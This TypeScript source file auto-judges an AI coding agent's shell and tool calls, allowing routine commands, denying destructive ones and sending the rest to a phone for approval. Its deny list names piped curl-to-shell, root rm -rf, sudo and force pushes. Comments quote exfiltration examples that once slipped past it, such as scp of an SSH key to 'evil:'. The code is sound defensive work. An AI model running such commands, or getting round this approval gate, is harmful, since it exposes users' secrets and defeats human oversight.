// Auto-judge routine operations — only escalate real decisions to phone.
//
// Allowlist is generous on purpose: this is a curated-interruption remote, not
// a security boundary. The phone is the second line of defense; the deny list
// here is reserved for genuinely irreversible/destructive shapes that no
// phone-tap should ever accidentally approve.
//
// Layered checks (first match wins):
//   1. Always-safe tool name → allow
//   2. Static DANGEROUS_BASH → deny
//   3. Static SAFE_BASH → allow, judged PER SEGMENT: the command is split on
//      ; && || | & and newlines (quote-aware) and EVERY segment must be on the
//      allowlist; any output redirect (other than to /dev/null or an fd dup),
//      `$(…)`, backtick, process substitution or subshell escalates
//   4. Learned-allow (phone said yes once before for this shape) → allow
//   5. Otherwise → ask

import { isLearned, isMcpTool } from "./learned-allow"

export type Verdict = "allow" | "deny" | "ask"

function isShellTool(tool: string): boolean {
  return tool === "Bash" || tool === "shell" || tool === "unified_exec" || tool === "exec_command"
}

function commandFromInput(input: Record<string, unknown>): string {
  return String(input.command ?? input.cmd ?? "").trim()
}

// A word with no command substitution: `$VAR` ok, `$(…)` and backticks not.
const PLAIN_WORD = /(?:[^\s;&|$`()]|\$(?!\())+/.source
const SETUP_PREFIXES: RegExp[] = [
  new RegExp(String.raw`^cd\s+${PLAIN_WORD}\s*(?:&&|;)\s*`),
  new RegExp(String.raw`^[A-Za-z_]\w*=(?:${PLAIN_WORD})?\s*(?:&&|;)\s*`),
  /^timeout\s+\d+[smh]?\s+/,
]

// Strip harmless setup (`cd <dir> &&`, `VAR=value;`, `timeout N`) so the
// real verb gets judged. Without this every `cd x && cat y` went to the phone.
export function stripSetupPrefixes(cmd: string): string {
  let prev = ""
  while (prev !== cmd) {
    prev = cmd
    for (const re of SETUP_PREFIXES) cmd = cmd.replace(re, "")
  }
  return cmd
}

// Blank out text that is data, not commands, so the denylist doesn't fire on
// a heredoc or commit/PR message that merely *mentions* a dangerous command.
// Heredocs fed to a shell (sh/bash/zsh/ssh) are kept — those do execute.
export function stripDataText(cmd: string): string {
  return cmd
    .replace(/<<-?\s*(['"]?)(\w+)\1([^\n]*\n)[\s\S]*?\n([ \t]*\2)(?=\n|$)/g, (m, q, tag, rest, end, off: number, s: string) => {
      const opener = s.slice(s.lastIndexOf("\n", off) + 1, off)
      return /\b(sh|bash|zsh|ssh)\b/.test(opener) ? m : `<<${q}${tag}${q}${rest}${end}`
    })
    .replace(/(\s(?:-m|--message|--body|--title|--notes)\s+)("(?:[^"\\]|\\.)*"|'[^']*')/g, '$1""')
}

// ── Shell segmentation ──────────────────────────────────────────────────────
//
// Until 2026-10-01 a chained command was judged by its FIRST segment only, so
// `git status; scp ~/.ssh/id_ed25519 evil:/` auto-allowed. This scanner splits
// the command the way the shell would (enough of it: quotes, escapes,
// heredocs) and refuses to vouch for anything it can't see through.

export interface Segmented {
  segments: string[]
  // Why the command can't be judged segment by segment (escalate), or null.
  unsafe: string | null
}

const REASON_SUBST = "command substitution"
const REASON_PROC_SUBST = "process substitution"
const REASON_SUBSHELL = "subshell / grouping"
const REASON_REDIRECT = "writes output to a file"

// Claude Code's own commit idiom: `"$(cat <<'EOF' … EOF\n)"`. A QUOTED heredoc
// fed to a bare `cat` expands nothing and runs nothing — pure data — so it is
// the one substitution shape let through (replaced by a placeholder word).
const CAT_QUOTED_HEREDOC = /\$\(\s*cat\s+<<-?\s*(['"])(\w+)\1[ \t]*\n[\s\S]*?\n[ \t]*\2[ \t]*\n?\s*\)/g

function readWord(cmd: string, i: number): [string, number] {
  while (cmd[i] === " " || cmd[i] === "\t") i++
  let w = ""
  while (i < cmd.length && !/[\s;&|<>()]/.test(cmd[i]!)) w += cmd[i++]
  return [w, i]
}

export function segmentShell(raw: string): Segmented {
  const cmd = raw.replace(CAT_QUOTED_HEREDOC, "HEREDOC_TEXT")
  const segments: string[] = []
  let cur = ""
  let i = 0
  const heredocs: Array<{ tag: string; quoted: boolean; strip: boolean }> = []
  const flush = (): void => { if (cur.trim()) segments.push(cur.trim()); cur = "" }
  const fail = (why: string): Segmented => ({ segments: [], unsafe: why })

  while (i < cmd.length) {
    const c = cmd[i]!
    const n = cmd[i + 1]
    if (c === "\\") {
      // Escaped char is literal; backslash-newline is a line continuation.
      cur += n === "\n" ? " " : c + (n ?? "")
      i += 2
      continue
    }
    if (c === "'") {
      const j = cmd.indexOf("'", i + 1)
      const end = j < 0 ? cmd.length : j + 1
      cur += cmd.slice(i, end)
      i = end
      continue
    }
    if (c === '"') {
      let j = i + 1
      while (j < cmd.length && cmd[j] !== '"') {
        if (cmd[j] === "\\") { j += 2; continue }
        if (cmd[j] === "`" || (cmd[j] === "$" && cmd[j + 1] === "(")) return fail(REASON_SUBST)
        j++
      }
      cur += cmd.slice(i, j + 1)
      i = j + 1
      continue
    }
    if (c === "`" || (c === "$" && n === "(")) return fail(REASON_SUBST)
    if ((c === "<" || c === ">") && n === "(") return fail(REASON_PROC_SUBST)
    if (c === "(" || c === ")" || ((c === "{" || c === "}") && /^\s*$/.test(cur.slice(-1) || " ") && /^(?:[\s;]|$)/.test(n ?? ""))) {
      return fail(REASON_SUBSHELL)
    }
    if (c === "<" && n === "<") {
      if (cmd[i + 2] === "<") { cur += "<<<"; i += 3; continue } // here-string
      let j = i + 2
      const strip = cmd[j] === "-"
      if (strip) j++
      while (cmd[j] === " " || cmd[j] === "\t") j++
      const q = cmd[j] === "'" || cmd[j] === '"' ? cmd[j] : cmd[j] === "\\" ? "\\" : ""
      if (q) j++
      let tag = ""
      while (j < cmd.length && /\w/.test(cmd[j]!)) tag += cmd[j++]
      if (q && q !== "\\" && cmd[j] === q) j++
      if (!tag) return fail("unparsed heredoc")
      heredocs.push({ tag, quoted: !!q, strip })
      cur += `<<${tag}`
      i = j
      continue
    }
    if (c === ">" || (c === "&" && n === ">")) {
      // Output redirect: `>`, `>>`, `>|`, `>&N`, `&>`, `&>>` (an fd number
      // before `>` is already in `cur`). Only /dev/null and fd dups are inert.
      let j = c === "&" ? i + 1 : i
      j++ // past '>'
      let dup = false
      if (cmd[j] === ">" || cmd[j] === "|") j++
      else if (cmd[j] === "&" && c !== "&") { dup = true; j++ }
      const [target, after] = readWord(cmd, j)
      if (dup ? !/^(\d+|-)$/.test(target) : target !== "/dev/null") return fail(REASON_REDIRECT)
      cur += " "
      i = after
      continue
    }
    if (c === ";" || c === "\n") {
      flush()
      i++
      if (c === "\n" && heredocs.length) {
        // Heredoc bodies follow the line that opened them: data, not commands.
        for (const h of heredocs) {
          let closed = false
          while (i < cmd.length) {
            const nl = cmd.indexOf("\n", i)
            const line = cmd.slice(i, nl < 0 ? cmd.length : nl)
            i = nl < 0 ? cmd.length : nl + 1
            if ((h.strip ? line.replace(/^\t+/, "") : line) === h.tag) { closed = true; break }
            if (!h.quoted && (line.includes("`") || line.includes("$("))) return fail(REASON_SUBST)
          }
          if (!closed) return fail("unterminated heredoc")
        }
        heredocs.length = 0
      }
      continue
    }
    if (c === "&" || c === "|") {
      flush()
      i += n === c || (c === "|" && n === "&") ? 2 : 1
      continue
    }
    cur += c
    i++
  }
  if (heredocs.length) return fail("unterminated heredoc")
  flush()
  return { segments, unsafe: null }
}

// Setup that changes nothing by itself: `cd <dir>` and `VAR=value` (a plain
// shell variable). Assignments to variables that steer how later commands
// resolve or start (PATH, LD_*, GIT_*, …) are not setup — `PATH=/tmp/x; git
// status` runs /tmp/x/git.
const SENSITIVE_VAR = /^(PATH|IFS|BASH_ENV|ENV|CDPATH|PROMPT_COMMAND|SHELLOPTS|BASHOPTS|HOME|ZDOTDIR|EDITOR|VISUAL|PAGER|GIT_\w*|LD_\w*|DYLD_\w*|NODE_\w*|PYTHON\w*|PERL\w*|RUBY\w*|BUN_\w*|NPM_\w*)$/
const PLAIN_ARG = /^(?:[^\s;&|$`()]|\$(?!\())+$/

function isSetupSegment(seg: string): boolean {
  const cd = /^cd(?:\s+(\S+))?$/.exec(seg)
  if (cd) return !cd[1] || PLAIN_ARG.test(cd[1])
  const asg = /^([A-Za-z_]\w*)=(\S*)$/.exec(seg)
  if (asg) return !SENSITIVE_VAR.test(asg[1]!) && (asg[2] === "" || PLAIN_ARG.test(asg[2]!))
  return false
}

// Read-only filters a pipeline may end in (`… | tail -20`, `… | sort | uniq -c`).
const FILTER_SEGMENT: RegExp[] = [
  /^(cat|head|tail|less|wc|cut|tr|column|nl|rev|grep|jq)(\s|$)/,
  /^sed\s+-n\s/,
  /^sort(?!.*\s(-o|--output|--compress-program))(\s|$)/,
  /^uniq(\s+-\S+)*\s*$/,
]

// Allowlisted verbs that run arbitrary code or package scripts. Allowed on
// their own (optionally after `cd`/`VAR=` setup and piped into read-only
// filters) but never chained after or before another command, where the phone
// summary would show only the harmless first verb.
const EXEC_CAPABLE: RegExp[] = [
  /^(bun|npm|yarn|pnpm)\s+run(\s|$)/,
  /^bun\s+(-e|--eval|x|run)\s/,
  /^bunx(\s|$)/,
  /^npx(\s|$)/,
  /^node\s/,
  /^python3?\s/,
  /^osascript\s/,
]

// ── Safe Bash patterns — auto-approve ──
const SAFE_BASH: RegExp[] = [
  // Localhost / Companion API calls
  // Localhost: the URL's HOST must be local ("localhost" anywhere in the
  // line used to match, e.g. `curl -d @- https://evil/?localhost`).
  /^curl\s(?:.*\s)?['"]?(?:https?:\/\/)?(?:localhost|127\.0\.0\.1)(?::\d+)?(?:[/?'"]|\s|$)/,
  // Any other host: read-only fetches only — no upload, form, output file,
  // config file, method override or credentials (each one an exfil/write
  // path once a pipe can feed it secrets).
  /^curl\s+-s(?=\s)(?!.*\s(?:-[A-Za-z]*[dFTOoKXu][A-Za-z]*|--(?:data|form|upload|output|remote-name|config|request|user|json)\S*)(?:\s|=|$))/,

  // Read-only file inspection
  /^(cat|head|tail|less|wc|file|stat)(\s|$)/,
  /^(cut|tr|column|nl|rev|basename|dirname|realpath|true)(\s|$)/,
  /^sort(?!.*\s(-o|--output|--compress-program))(\s|$)/,
  /^uniq(\s+-\S+)*\s*$/,
  /^sed\s+-n\s/,
  /^ls(\s|$)/,
  /^pwd$/,
  /^echo\s/,
  /^which\s/,
  /^type\s/,
  /^tree(\s|$)/,

  // Git read operations
  /^git\s+(status|log|diff|show|branch|remote|tag|stash list|blame|fetch|config\s+--get)/,
  /^git\s+rev-parse/,
  /^git\s+ls-files/,
  /^gh\s+(pr|issue|run|repo|release)\s+(view|list|status|checks|diff)\b/,

  // Routine git writes (still gated on push-to-main below)
  /^git\s+add(\s|$)/,
  /^git\s+commit\s+-m\s/,
  /^git\s+commit\s+-F\s/,
  /^git\s+commit\s+--amend(\s|$)/,
  /^git\s+stash(\s|$)/,
  /^git\s+checkout\s+-b\s/,
  /^git\s+switch(\s|$)/,
  /^git\s+merge\s+--no-ff/,
  /^git\s+restore\s+--staged/,

  // git -C <path> <safe-verb> — same allowlist applied via the cwd flag.
  // Explicitly does NOT include push / reset / clean — those keep their
  // existing routing (push falls to branch-guard, reset/clean to
  // DANGEROUS_BASH for protected forms or "ask" otherwise).
  /^git\s+-C\s+\S+\s+(status|log|diff|show|branch|remote|tag|blame|fetch|rev-parse|ls-files|stash\s+list|config\s+--get|add|commit\s+-(m|F|-amend)|stash|checkout\s+-b|switch|merge\s+--no-ff|restore\s+--staged)\b/,

  // Package info + scripts
  /^(bun|npm|yarn|pnpm)\s+(list|ls|info|view|outdated|why)/,
  /^(bun|npm|yarn|pnpm)\s+run(\s|$)/,
  /^bun\s+(-e|--eval|x|run)\s/,
  /^bunx(\s|$)/,
  /^npx(\s|$)/,
  /^node\s+(-e|--eval|--version|-v)/,
  /^node\s+[^|;&]+\.(m?js|cjs|ts)(\s|$)/,
  /^python3?\s+(-c|-m|--version)/,
  /^python3?\s+[^|;&]+\.py(\s|$)/,

  // Build / typecheck / lint / format / test
  /^(tsc|bunx tsc)\s/,
  /^bunx\s+(shadcn|tailwindcss|vite|tsx|prisma|drizzle-kit)/,
  /^(prettier|eslint|biome|stylelint)\s/,
  /^(vitest|jest|playwright|cypress)\s/,

  // Database CLIs — read-shaped queries OR interactive shells
  /^(turso|sqlite3|psql|mysql)\s.*\b(show|list|describe|select|explain)\b/i,
  /^turso\s+db\s+(shell|list|show|tokens|locations|inspect|config)/,
  /^sqlite3\s+[^\s]+\s*$/,

  // Process / system inspection
  /^(ps|top|htop|lsof|pgrep|kill\s+-0)\s/,
  // Word-bounded: `env` with arguments RUNS them (`env scp …`), so only bare.
  /^(df|du|free|uptime|date|whoami|id|hostname|sw_vers)(\s|$)/,
  /^env\s*$/,
  /^printenv(\s+\w+)*\s*$/,
  /^(networkstat|netstat|ifconfig|ipconfig)/,

  // Search
  // …minus the flags that run a command or delete: find -exec/-delete,
  // fd -x/-X, rg --pre.
  /^(grep|ag)\s/,
  /^rg(?=\s)(?!.*\s--pre\b)/,
  /^find(?=\s)(?!.*\s-(exec|execdir|ok|okdir|delete|fprint|fprint0|fprintf|fls)\b)/,
  /^fd(?=\s)(?!.*\s(-x|-X|--exec|--exec-batch)\b)/,
  /^jq\s/,

  // Misc safe utilities
  /^(open|pbcopy|pbpaste|say|afplay)\s/,
  /^osascript\s+-e\s/,
  /^tailscale\s+(status|ip|cert)/,
  /^(mkdir|cp|mv|ln|touch|chmod\s+\+x)\s/,
]

// ── Dangerous Bash patterns — auto-deny ──
// Keep this list short and high-confidence. Anything ambiguous goes to the
// phone, not denied outright.
const DANGEROUS_BASH: RegExp[] = [
  // rm -rf on roots
  /\brm\s+-rf?\s+\/(\s|$)/,
  /\brm\s+-rf?\s+~(\s|$)/,
  /\brm\s+-rf?\s+\$HOME(\s|$)/,
  /\brm\s+-rf?\s+\.\s*$/,
  /\brm\s+-rf?\s+\*\s*$/,

  // Force push — genuinely destructive (rewrites shared history)
  /\bgit\s+(-C\s+\S+\s+)?push\s+.*--force\b/,
  /\bgit\s+(-C\s+\S+\s+)?push\s+.*-f\b/,
  // Non-force `git push origin main` is a fast-forward — not destructive.
  // It should ask on the phone, not auto-deny. branch-guard already
  // auto-allows non-force pushes on feature branches.

  // History rewrites on shared branches
  /\bgit\s+(-C\s+\S+\s+)?reset\s+--hard\s+(origin\/)?(main|master)\b/,
  /\bgit\s+(-C\s+\S+\s+)?clean\s+-fd?x?\s+\/(\s|$)/,

  // System-level danger
  /\bsudo\s/,
  /\bchmod\s+-R\s+777\b/,
  /\bcurl\s.*\|\s*(sh|bash|zsh)\b/,
  /\bwget\s.*\|\s*(sh|bash|zsh)\b/,

  // SQL destructive ops — only when invoked through a CLI -c/-e/--command flag.
  // Matching arbitrary `DROP TABLE` text caused false-positives on inline JS
  // scripts that referenced these keywords as data or comments.
  /^(turso|sqlite3|psql|mysql)\s.*(-c|-e|--command|--execute)\s+["'][^"']*\b(DROP\s+(TABLE|DATABASE)|TRUNCATE\s+TABLE|DELETE\s+FROM\s+\S+\s*;?\s*$)/i,
]

// ── Safe tool names — auto-approve entirely ──
const ALWAYS_SAFE_TOOLS = new Set([
  "Read",
  "Glob",
  "Grep",
  "LSP",
  "WebSearch",
  "WebFetch",
  "TodoRead",
  "TodoWrite",
  "TaskCreate",
  "TaskUpdate",
  "TaskList",
  "TaskGet",
  "TaskOutput",
  "TaskStop",
  "ToolSearch",
  "Skill",
  "ScheduleWakeup",
  "SubagentHandback",
])

export interface Judgement {
  verdict: Verdict
  // Short human-readable why. Shown on the phone under the approval intent
  // line ("why · <reason>") when the verdict is "ask".
  reason: string
}

export const REASON_NOT_ALLOWLISTED = "not on the Bash allowlist"
export const REASON_SECRETS_FILE = "writes a secrets/env file"
export const REASON_CLAUDE_SETTINGS = "edits Claude settings"
export const REASON_LEARNED = "previously approved on phone"
export const REASON_MCP_READONLY = "read-only MCP tool"
export const reasonNotAutoApproved = (tool: string): string => `${tool} not auto-approved`

const matches = (res: RegExp[], seg: string): boolean => res.some((re) => re.test(seg))

// `timeout N cmd` runs cmd: judge cmd.
function unwrap(seg: string): string {
  let prev = ""
  while (prev !== seg) { prev = seg; seg = seg.replace(/^timeout\s+\d+[smh]?\s+/, "") }
  return seg
}

// allow: every segment is setup, allowlisted, or (for a lone exec-capable
// verb) a read-only filter. `why` is set when the shape itself is the problem
// (substitution, redirect, chain around an exec-capable verb) — then the
// learned table is not consulted either, since nothing chained is learnable.
export function judgeSegments(raw: string): { allow: boolean; why: string | null } {
  const { segments, unsafe } = segmentShell(raw)
  if (unsafe) return { allow: false, why: `${unsafe} — ${REASON_NOT_ALLOWLISTED}` }
  const work = segments.map(unwrap).filter((s) => !isSetupSegment(s))
  if (work.length === 0) return { allow: false, why: null }
  const execIdx = work.findIndex((s) => matches(EXEC_CAPABLE, s))
  if (execIdx >= 0) {
    // One exec-capable verb, optionally piped into read-only filters after it.
    const rest = work.slice(execIdx + 1)
    const ok = execIdx === 0 && matches(SAFE_BASH, work[0]!) && rest.every((s) => matches(FILTER_SEGMENT, s))
    return ok ? { allow: true, why: null } : { allow: false, why: work.length > 1 ? `chained with code execution — ${REASON_NOT_ALLOWLISTED}` : null }
  }
  if (work.every((s) => matches(SAFE_BASH, s))) return { allow: true, why: null }
  return { allow: false, why: null }
}

// Verdict + reason. First match wins, same layering as described above.
export function autoJudgeWithReason(tool: string, input: Record<string, unknown>): Judgement {
  if (ALWAYS_SAFE_TOOLS.has(tool)) return { verdict: "allow", reason: `${tool} is always safe` }

  if (isShellTool(tool)) {
    const raw = commandFromInput(input)

    const code = stripDataText(raw)
    for (const pattern of DANGEROUS_BASH) {
      if (pattern.test(code) || pattern.test(stripSetupPrefixes(code))) return { verdict: "deny", reason: "matches the destructive-command denylist" }
    }

    const seg = judgeSegments(raw)
    if (seg.allow) return { verdict: "allow", reason: "on the Bash allowlist" }
    if (seg.why) return { verdict: "ask", reason: seg.why }

    // Learned-allow: check AFTER the static DANGEROUS list so a one-time
    // "yes" can never override the catastrophe denylist.
    if (isLearned(tool, input)) return { verdict: "allow", reason: REASON_LEARNED }

    return { verdict: "ask", reason: REASON_NOT_ALLOWLISTED }
  }

  if (tool === "Edit" || tool === "Write" || tool === "MultiEdit") {
    const filePath = (input.file_path as string) ?? ""

    if (/\.(env|pem|key|secret|credentials)(\b|\.)/.test(filePath)) return { verdict: "ask", reason: REASON_SECRETS_FILE }
    if (/settings\.json|settings\.local\.json/.test(filePath)) return { verdict: "ask", reason: REASON_CLAUDE_SETTINGS }
    if (/password|token|secret/i.test(filePath)) return { verdict: "ask", reason: REASON_SECRETS_FILE }

    return { verdict: "allow", reason: "routine file edit" }
  }

  // Read-only MCP verbs (search_/get_/list_/read_/query_ on the tool name's
  // last segment) are auto-allowed, unless the name also says it changes
  // something.
  if (isMcpTool(tool)) {
    const verb = (tool.split("__").pop() ?? "").toLowerCase()
    if (/^(search|get|list|read|query)_/.test(verb) && !/send|create|update|delete|trash|label|modify/.test(verb)) {
      return { verdict: "allow", reason: REASON_MCP_READONLY }
    }
  }

  // Other tools (e.g. Web*, MCP tools): consult the learned table before
  // bouncing to phone. Tools with no derivable pattern (see learned-allow.ts)
  // fall through to "ask".
  if (isLearned(tool, input)) return { verdict: "allow", reason: REASON_LEARNED }

  return { verdict: "ask", reason: reasonNotAutoApproved(tool) }
}

// Verdict-only wrapper — kept for callers that don't need the reason.
export function autoJudge(tool: string, input: Record<string, unknown>): Verdict {
  return autoJudgeWithReason(tool, input).verdict
}
